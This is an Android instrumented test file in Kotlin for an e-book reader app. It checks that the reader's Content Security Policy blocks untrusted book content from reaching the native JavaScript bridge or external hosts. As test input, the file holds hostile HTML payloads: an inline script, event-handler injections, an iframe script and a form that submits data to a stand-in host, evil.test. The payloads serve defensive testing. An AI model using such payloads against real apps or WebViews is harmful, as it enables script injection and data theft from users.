package com.shelf.reader

import android.content.pm.PackageManager
import android.webkit.*
import androidx.compose.ui.test.junit4.createAndroidComposeRule
import com.shelf.reader.data.ReaderSettings
import com.shelf.reader.ui.reader.ReaderHtml
import org.junit.Assert.*
import org.junit.Rule
import org.junit.Test
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicReference

class ReaderSecurityTest {
    @get:Rule val compose = createAndroidComposeRule<MainActivity>()
    class Probe {
        val calls = AtomicInteger()
        @JavascriptInterface fun hit() { calls.incrementAndGet() }
        @JavascriptInterface fun onReady() { }
    }

    @Test fun installedAppHasNoInstallerPermissionOrUpdateFileProvider() {
        val context = compose.activity
        @Suppress("DEPRECATION")
        val info = context.packageManager.getPackageInfo(context.packageName, PackageManager.GET_PERMISSIONS or PackageManager.GET_PROVIDERS)
        assertFalse(info.requestedPermissions.orEmpty().contains("android.permission.REQUEST_INSTALL_PACKAGES"))
        assertFalse(info.providers.orEmpty().any { it.authority == "${context.packageName}.updates" })
    }

    @Test fun readerCspBlocksUntrustedScriptsHandlersFramesAndFormNavigation() {
        val loaded = CountDownLatch(1)
        val probe = Probe()
        val requests = java.util.concurrent.ConcurrentLinkedQueue<String>()
        lateinit var web: WebView
        compose.runOnUiThread {
            web = WebView(compose.activity).apply {
                settings.javaScriptEnabled = true
                settings.allowFileAccess = false
                settings.allowContentAccess = false
                addJavascriptInterface(probe, "SecurityProbe")
                addJavascriptInterface(probe, "Shelf")
                webViewClient = object : WebViewClient() {
                    override fun onPageFinished(view: WebView, url: String) { loaded.countDown() }
                    override fun shouldInterceptRequest(view: WebView, request: WebResourceRequest): WebResourceResponse {
                        requests.add(request.url.toString())
                        return WebResourceResponse("text/plain", "UTF-8", ByteArray(0).inputStream())
                    }
                    override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
                        return true // Same final navigation boundary as the production reader.
                    }
                }
            }
            // Deliberately bypass the sanitizer: the independent CSP layer must still protect the bridge.
            val body = """<p id="epub-chapter">Reading text</p><script>SecurityProbe.hit()</script>
                <img src="https://evil.test/pixel" onerror="SecurityProbe.hit()">
                <button id="hostile" onclick="SecurityProbe.hit()">test</button>
                <iframe srcdoc="&lt;script&gt;parent.SecurityProbe.hit()&lt;/script&gt;"></iframe>
                <form id="hostile-form" action="https://evil.test/upload"><input name="value" value="private"></form>"""
            val page = ReaderHtml.page(ReaderHtml.section(0, -1, "Chapter", body) { it }, ReaderSettings(), 0, 0)
            web.loadDataWithBaseURL(ReaderHtml.ORIGIN + "/", page, "text/html", "UTF-8", null)
        }
        try {
            assertTrue(loaded.await(30, TimeUnit.SECONDS))
            val evaluated = CountDownLatch(1)
            val result = AtomicReference("")
            compose.runOnUiThread {
                web.evaluateJavascript("""document.getElementById('hostile').click();document.getElementById('hostile-form').requestSubmit();JSON.stringify({trusted:typeof window.shelfScrollTo,anchor:window.shelfScrollToId('chapter')})""") {
                    result.set(it); evaluated.countDown()
                }
            }
            assertTrue(evaluated.await(10, TimeUnit.SECONDS))
            assertTrue(result.get(), result.get().contains("function"))
            assertTrue(result.get(), result.get().contains("true"))
            assertEquals("Untrusted book code called a native bridge", 0, probe.calls.get())
            assertTrue("Reader attempted external requests: $requests", requests.none { it.startsWith("https://evil.test") })
        } finally { compose.runOnUiThread { web.destroy() } }
    }
}
